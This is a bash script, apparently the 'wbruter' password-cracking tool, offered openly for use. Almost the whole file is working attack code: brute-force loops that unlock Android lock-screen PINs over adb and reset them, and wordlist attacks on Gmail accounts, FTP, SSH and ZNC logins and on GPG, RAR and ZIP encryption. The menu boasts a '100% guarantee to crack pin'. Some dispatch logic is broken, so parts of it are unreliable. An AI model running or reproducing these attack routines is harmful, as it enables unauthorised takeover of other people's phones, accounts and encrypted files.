#!/bin/bash
###############################################################################
###############################################################################
###############################################################################
####                                                                       ####
#### Copyright (C) 2019  wuseman <wuseman@nr1.nu> - All Rights Reserved    ####
#### Created: 12/12/2018                                                   ####
####                                                                       ####
#### A notice to all nerds.                                                ####
#### If you will copy developers real work it will not make you a hacker.  ####
#### Resepect all developers, we doing this because it's fun!              ####
####                                                                       ####
###############################################################################
###############################################################################
################################ SOURCE CODE ##################################
###############################################################################
###################### EMAGNET WAS FOUNDED BY WUSEMAN #########################
###############################################################################
###############################################################################
####                                                                      #####
#### EMAGNET SOURCE CODE BEGINS HERE FEEL FREE TO USE AND EDIT THE SOURCE #####
####   OF EMAGNET AS YOU WISH ASLONG AS ORIGIN AUTHOR WILL BE MENTIONED   #####
####                                                                      #####
###############################################################################
#################################################################### 2o18 #####
###############################################################################
VERSION="2.0"

android() {
androiddebug() {
case $(adb devices | awk '{print $2}' | sed 1d | sed '$d') in  
    "unauthorized") echo " * You must enable usb-debugging in developer settings." ;;
esac
}

adbexist() {
adb="$(which adb 2> /dev/null)"
distro="$(cat /etc/os-release | head -n 1 | cut -d'=' -f2 | sed 's/"//g')"

if [ -z "$adb" ]; then
 echo -e "\nThis tool require adb to be installed..\n"
  read -p "Install adb (Y/n) " adbinstall
fi

case $adbinstall in
     "Y")
        echo -e "\nPlease wait..\n"
      sleep 1
case $distro in
     "Gentoo")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        emerge --ask android-tools ;;
     "Sabayon")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        emerge --ask android-tools ;;
     "Ubuntu")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Debian")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Raspbian")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Mint")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "no") echo "Aborted." ;
           exit 0 ;;
esac
       echo -e "This tool is not supported for $distro, please go compile it from source instead...\n"
esac
}

connectedornot() {
isphoneconnected="$(adb devices | sed '1d' | sed '/^$/d')"
 if [ ! $isphoneconnected 2> /dev/null ]; then
      echo "* Your device is not connected properly.."
      exit
fi
}

androidpinattack6() {
cr=`echo $'\n.'`
cr=${cr%.}
    printf "%52s\n" | tr ' ' '-'
    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
    printf "%52s\n" | tr ' ' '-'
for i in {000000..999999}; do
if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
    printf "Wrong PIN: \e[1;31m$i\e[0m\n"
else
    printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
    printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
case $newpin in
   y)
    read -p "Pin: " newpin2
    adb shell locksettings set-pin $newpin2
    printf "\nIt is required to restart your device after\n"
    printf "PIN code has been set after old pin was erased..\n\n"
    ;;
   N)
    printf "\nIt is required to restart your device after\n"
    printf "PIN code has been erased from your device..\n\n";
    ;;
esac
    read -p "restart device (y/N): " rebootornot
case $rebootornot in
    y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
    N) printf "\nPin was cracked by wbruter v1.5\n\n";exit 0 ;;
esac
    exit
fi
done
}

androidpinattack() {
cr=`echo $'\n.'`
cr=${cr%.}
    printf "%52s\n" | tr ' ' '-'
    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
    printf "%52s\n" | tr ' ' '-'
for i in {0000..9999}; do
if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
    printf "Wrong PIN: \e[1;31m$i\e[0m\n"
else
    printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
    printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
case $newpin in
   y)
    read -p "Pin: " newpin2
    adb shell locksettings set-pin $newpin2
    printf "\nIt is required to restart your device after\n"
    printf "PIN code has been set after old pin was erased..\n\n"
    ;;
   N)
    printf "\nIt is required to restart your device after\n"
    printf "PIN code has been erased from your device..\n\n";
    ;;
esac
    read -p "restart device (y/N): " rebootornot
case $rebootornot in
    y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
    N) printf "\nPin was cracked by wbruter v1.5\n\n";exit 0 ;;
esac
    exit
fi
done
}


android_gui_pin_attack() {
screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
case $screen in
 "mScreenState=OFF") echo -e "Preparing to attack."; 
                     echo -e "All Has Been Set" ;;
 "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
esac
   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
   adb shell input keyevent 82
   adb shell input swipe 407 1211 378 85
for i in {0000..9999}; do
   echo -e "\e[0;1mTrying pin:  $i\e[0m"
for (( j=0; j<${#i}; j++ )); do
   adb shell input keyevent $((`echo ${i:$j:1}`+7))
done
   adb shell input keyevent 66
   adb shell input swipe 407 1211 378 85
clear() {
   adb shell input keyevent KEYCODE_MOVE_END
   adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
if ! (( `expr $i + 1` % 4 )); then
   adb shell input keyevent 66
   sleep 30
   adb shell input keyevent 82
   adb shell input swipe 407 1211 378 85
fi
done
}

android_gui_pin6_attack() {
screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
case $screen in
 "mScreenState=OFF") echo -e "Preparing to attack."; 
                     echo -e "All Has Been Set" ;;
 "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
esac
   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
   adb shell input keyevent 82
   adb shell input swipe 407 1211 378 85
for i in {000000..999999}; do
   echo -e "\e[0;1mTrying pin:  $i\e[0m"
for (( j=0; j<${#i}; j++ )); do
   adb shell input keyevent $((`echo ${i:$j:1}`+7))
done
   adb shell input keyevent 66
   adb shell input swipe 407 1211 378 85
clear() {
   adb shell input keyevent KEYCODE_MOVE_END
   adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
if ! (( `expr $i + 1` % 4 )); then
   adb shell input keyevent 66
   sleep 30
   adb shell input keyevent 82
   adb shell input swipe 407 1211 378 85
fi
done
}
      adbexist;connectedornot;androiddebug
}

ftpattack() {
which ftp &> /dev/null
if [[ $? -eq "1" ]]; then
   printf "You must install 'ftp' package, aborted" 
   exit 0
fi

re='^[0-9]+$'
read -p "FTP Username: " username; if [[ -z $username ]]; then echo "You must enter a username, aborted"; exit 0;fi
read -p "FTP Host: " host; if [[ -z $host ]];then echo "You must enter a hostname or ip number, aborted";exit 0;fi
read -p "FTP Port: " port;if [[ -z $port ]];then echo "You must enter a port, aborted.";exit 0;fi
if ! [[ $port =~ $re ]];then echo "That's not a valid port, aborted" >&2; exit 1;fi
read -p "Wordlist: " wordlist;if [[ -z $wordlist ]]; then echo "You must enter a a wordlist";exit 0;fi
if [[ ! -f $wordlist ]];then echo "Can't find $wordlist, aborted"; exit 0;fi


printf "\n====================================================="
printf "\nBruteforce attack will be started within 2 seconds..\n"
printf "Please use (CTRL+C) to abort the attack at anytime..\n"
printf "=====================================================\n"
sleep 2
while read line; do
ftpbrute=$(curl -su $username:$line ftp://$host:$port)
if [[ -n "$ftpbrute"  ]]; then
echo -e "====================================================="
echo -e "Password for $username has been found: \e[1;32m$line\e[0m"
echo -e "=====================================================\n"
exit 0
else
echo -e "Wrong password for $user: \e[1;31m$line\e[0m"
fi
done < $wordlist
echo -e "====================================================="
echo -e "No password in $wordlist matched $username password.."
echo -e "=====================================================\n"
}

gmailattack() {
requirements_gmail() {
if [[ -n $(curl -v &> /dev/null) ]]; then
    echo "Curl is required for this tool, aborted."
    exit 1
fi
}


gmail_attack() {
if [[ -n $(curl -v &> /dev/null) ]]; then
    echo "Curl is required for this tool, aborted."
        exit 1
fi

read -p $'Email: ' mail
if [[ ! "$mail" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$ ]]; then
   echo -e "Error: email address $email is invalid, aborted."
   exit 0
fi
read -p $'Wordlist: ' wordlist
if [[ ! -a $wordlist ]]; then
   echo "Error: There is no such wordlist, aborted"
   exit 0
fi

   echo -e ""
   echo -e "IP: $(curl -s https://nr1.nu/ip/ | sed -n '27p')"
   echo -e "Target: $mail"
   echo -e "Wordlist: $(pwd)/$wordlist"
   echo -e ""
   read -p $'If everything looks ok, type yes to begin the brute attack: (yes/no): ' ready
if [ $ready = "yes" ]; then
   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
while read -r line; do
name="$line"
attack="$(curl -s -u $mail:$name https://mail.google.com/mail/feed/atom | grep 'xml')"
if [ -z "$attack" ]; then
   echo ""
   echo -e "Wrong Password for $mail: \e[1;31m$name\e[0m"
fi

if [ -n "$attack" ]; then
   echo -e "---------------------------------------------------------------------------------------"
   echo -e  "Password Has Been Found: $name\n"
   echo -e "---------------------------------------------------------------------------------------"
   exit
fi
done < "$wordlist"
   echo -e ""
   echo -e  "Sorry, no passwords in $wordlist matched $mail current password. "
   echo -e   "Try your luck with another mwordlist instead..."
   exit
else
   echo -e "Aborted."
   echo -e " ---------------------------------------------------------------------------------------"
fi
}
requirements_gmail
gmail_attack
}

gpgattack() {
which gpg &> /dev/null
if [[ $? -eq "1" ]]; then
   printf "You must install 'gpg' package, aborted" 
   exit 0
fi

    read -p "GPG File: " GPG_FILE
    read -p "Wordlist: " WORDLIST
    echo -e ""
    echo -e "Target File: $GPG_FILE"
    echo -e "Wordlist: $WORDLIST"
    echo -e ""
    read -p $'If everything looks ok, type yes to begin the brute attack: (yes/no): ' ready
if [ $ready = "yes" ]; then
   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime..\n"
for word in $(cat $WORDLIST); do 
    echo $word | gpg --passphrase-fd 0 -q --batch --allow-multiple-messages --no-tty  --output $GPG_FILE -d $GPG_FILE 2> /dev/null
    echo -e "Wrong password: \e[1;31m$word\e[0m"
done;
if [ $? = "0" ]; then
    echo "--------------------------------------"
    echo -e "GPG passphrase: \e[1;32m${word}\e[0m";
    echo "--------------------------------------"
    exit 0;
fi

fi
}





rarattack() {
if [[ -n $(unrar -v &> /dev/null) ]]; then
    echo "unrar is required for this tool, aborted."
    exit 1
fi

wordlist="wordlist"
read -p "RAR Filename: (/path/to/file.rar): " rartarget

if [ ! -f $wordlist ]; then
   printf "Can't find $wordlist, aborted\n"
   exit
fi

if [[ ! -a $rartarget ]]; then
   printf "Sorry, can't $rartarget a such file, aborted\n"
   exit
fi
   printf "\n%51s" | tr ' ' '='
   printf "\nBruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime..\n"
   printf "%51s\n" | tr ' ' '='
   sleep 2
while read line; do
   echo "$line" | unrar p $rartarget &> /dev/null
if [[ $? = "0" ]]; then
   printf "%51s" | tr ' ' '='
   printf "\nPassword has been found: \e[1;32m$line\e[0m"
   printf "\n%51s\n\n" | tr ' ' '='
else
   printf "Wrong password: \e[1;31m$line\e[0m\n"
fi
done < wordlist
}


sshattack() {
read -p "SSH User: " USER
read -p "SSH Host: " HOST
read -p "SSH Wordlist: " WORDLIST
read -p "SSH Port (Default: 22): " PORT

printf "====================================================="
printf "\nBruteforce attack will be started within 2 seconds..\n"
printf "Please use (CTRL+C) to abort the attack at anytime..\n"
printf "=====================================================\n"
sleep 2

while read line; do
if [[ -z $PORT ]]; then
SSHPASS="$line" sshpass -e ssh -o StrictHostKeyChecking=no $USER@$HOST -p 22 ls &> /dev/null
else
SSHPASS="$line" sshpass -e ssh -o StrictHostKeyChecking=no $USER@$HOST -p $PORT ls &> /dev/null
fi

  if [[ $? -eq "0" ]]; then
     printf "=====================================================\n"
     printf "Password for $user has been found: \e[1;32m$line\e[0m\n"
     printf "=====================================================\n"
     exit 0
  else
     printf "Wrong password for $user: \e[1;31m$line\e[0m\n"
  fi
done < $WORDLIST

    printf "====================================================="
    printf "\nNo password in $wordlist matched $user password.."
    printf "\n=====================================================\n"
}


zipattack() {
read -p "ZiP File: " zippie
read -p "Wordlist: " wordish
printf "%50s\n" | tr ' ' '='
while read line; do
   unzip -P $line -o $zippie &> /dev/null
if [[ $? -eq 1 ]]; then
printf "Wrong password: \e[1;31m$line\e[0m\n"
else
printf "%50s\n" | tr ' ' '='
printf "Password Found: \e[1;32m$line\e[0m\n"
printf "%50s\n" | tr ' ' '='
exit
fi
done < $wordish
printf "%50s\n" | tr ' ' '='
echo "No password matched in $wordish - Try another wordlist"
printf "%50s\n" | tr ' ' '='
}

zncattack() {
read -p "ZNC User: " zuser
if [[ -z $zuser ]]; then
echo "You must enter a username, aborted"
exit 0
fi

read -p "ZNC Host: " zhost
if [[ -z $zhost ]]; then
echo "You must enter a hostname or ip number, aborted"
exit 0
fi

read -p "ZNC Port: " zport
if [[ -z $zport ]]; then
echo "You must enter a port, aborted."
exit 0
fi

if ! [[ $zport =~ $re ]] ; then
   echo "That's not a valid port, aborted" >&2; exit 1
fi

read -p "ZNC Wordlist: " zwordlist
if [[ -z $zwordlist ]]; then
echo "You must enter a a wordlist"
exit 0
fi

if [[ ! -f $zwordlist ]]; then
echo "Can't find $zwordlist, aborted"
exit 0
fi

printf "\n====================================================="
printf "\nBruteforce attack will be started within 2 seconds..\n"
printf "Please use (CTRL+C) to abort the attack at anytime..\n"
printf "=====================================================\n"
while read line; do
curl -s https://$zhost:$zport --user $zuser:$line | grep Unauthorized &> /dev/null
if [[ "$?" -gt "0" ]]; then
sleep 1
echo -e "====================================================="
echo -e "Password for $zuser has been found: \e[1;32m$line\e[0m"
echo -e "=====================================================\n"
exit 0
else
echo -e "Wrong password for $zuser: \e[1;31m$line\e[0m"
fi
done < $zwordlist
}





if [[ $1 = "--android" && $2 = "4" ]] || [[ $1 = "-a" && $2 = "four" ]]; then
      android; androidpinattack
elif [[ $1 = "--android" && $2 = "6" ]] || [[ $1 = "-a" && $2 = "six" ]]; then
      android;androidpinattack6
elif [[ $1 = "--android-gui" && $2 = "4" ]] || [[ $1 = "-A" && $2 = "four" ]]; then
      android;android_gui_pin_attack
elif [[ $1 = "--android-gui" && $2 = "6" ]] || [[ $1 = "-A" && $2 = "six" ]]; then
      android;android_gui_pin6_attack
#elif [[ $1 = "-a" && -z $2 ]]; then
#      printf "\nUsage: ./wbruter -a [four] [six] [password]\n\n"
#      printf "    Where:\n"
#      printf "         four)         - Attack a device with a 4 digit pin set\n"
#      printf "         six)          - Attack a device with a 6 digit pin set\n"
#   printf "         password)     - Attack a device with a password set\n\n" 
elif [[ $1 = "-f" || $1 = "-ftp" || $1 = "-ft" || $1 = "--ftp" ]]; then
     ftpattack
elif [[ $1 = "-g" || $1 = "-gmail" || $1 = "-g" || $1 = "--gmail" ]]; then
     gmailattack
elif [[ $1 = "-g" || $1 = "-gpg" || $1 = "--g" || $1 = "--gpg" ]]; then
     gpgattack
elif [[ $1 = "-r" || $1 = "-rar" || $1 = "--r" || $1 = "--rar" ]]; then
     rarattack
elif [[ $1 = "-z" || $1 = "-zip" || $1 = "--ZIP" || $1 = "--z" ]]; then
     zipattack
elif [[ $1 = "-Z" || $1 = "-znc"  || $1 = "--Z" || $1 = "--ZNC" ]]; then
     zncattack
else 
cat << "EOF"
      ___
     |   |        -a|--android     - Brute force attack an android device with 100% guarantee to crack pin
    _|___|_       -A|--androidgui  - Brute force attack android device via gui/login screen (OLD METHOD)
     (* *)        -f|--ftp         - Dictionary attack for any ftp/ftps server
    __)#(__       -g|--gmail       - Dictionary attack for gmail accounts
   ( )...( )(_)   -G|--gpg         - Dictionary attack for break the encryption of gpg files
   || |_| ||//    -h|--help        - Print this help, duh!
>==() | | ()/     -r|--rar         - Dictionary attack for break the encryption of rar files
    _(___)_       -s|--ssh         - Dictionary attack for break ssh login
   [-]   [-]      -z|--zip         - Brute force and dictionary attack a zip encryptedfile
                  -Z|--znc         - Dictionary attack for znc bouncer login (web)
~~~~~~~~~~~~~~~~

EOF
fi

